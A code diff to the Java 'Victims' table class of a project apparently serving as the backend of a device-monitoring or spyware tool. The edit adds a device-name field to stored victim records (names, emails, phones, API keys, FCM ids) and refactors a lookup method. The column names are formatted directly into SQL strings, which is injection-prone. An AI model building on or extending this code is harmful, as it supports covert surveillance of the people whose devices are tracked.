@@ -6,8 +6,6 @@ import com.theah64.xrob.api.models.Victim;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.SQLException;
-import java.util.ArrayList;
-import java.util.List;
 
 /**
  * Created by theapache64 on 11/22/2015.
@@ -38,7 +36,7 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public Victim get(String byColumn, String byValue) {
 
-        final String query = String.format("SELECT id,name,email,phone,api_key,fcm_id FROM victims WHERE %s = ? LIMIT 1", byColumn);
+        final String query = String.format("SELECT id,name,email,phone,api_key,fcm_id,device_name FROM victims WHERE %s = ? LIMIT 1", byColumn);
 
         final java.sql.Connection connection = Connection.getConnection();
         Victim victim = null;
@@ -58,8 +56,9 @@ public class Victims extends BaseTable<Victim> {
                 final String email = rs.getString(COLUMN_EMAIL);
                 final String apiKey = rs.getString(COLUMN_API_KEY);
                 final String fcmId = rs.getString(COLUMN_FCM_ID);
+                final String deviceName = rs.getString(COLUMN_DEVICE_NAME);
 
-                victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, null, null, null, null, false, null);
+                victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, deviceName, null, null, null, false, null);
             }
 
             rs.close();
@@ -134,34 +133,7 @@ public class Victims extends BaseTable<Victim> {
      */
     @Override
     public String get(String byColumn, String byValue, String columnToReturn) {
-
-
-        final String query = String.format("SELECT %s FROM victims WHERE %s = ?", columnToReturn, byColumn);
-
-        String resultValue = null;
-        final java.sql.Connection connection = Connection.getConnection();
-
-        try {
-            final PreparedStatement ps = connection.prepareStatement(query);
-            ps.setString(1, byValue);
-            final ResultSet rs = ps.executeQuery();
-
-            if (rs.first()) {
-                resultValue = rs.getString(columnToReturn);
-            }
-            rs.close();
-            ps.close();
-        } catch (SQLException e) {
-            e.printStackTrace();
-        } finally {
-            try {
-                connection.close();
-            } catch (SQLException e) {
-                e.printStackTrace();
-            }
-        }
-
-        return resultValue;
+        return super.getV2(TABLE_VICTIMS, byColumn, byValue, columnToReturn);
     }
 
     @Override
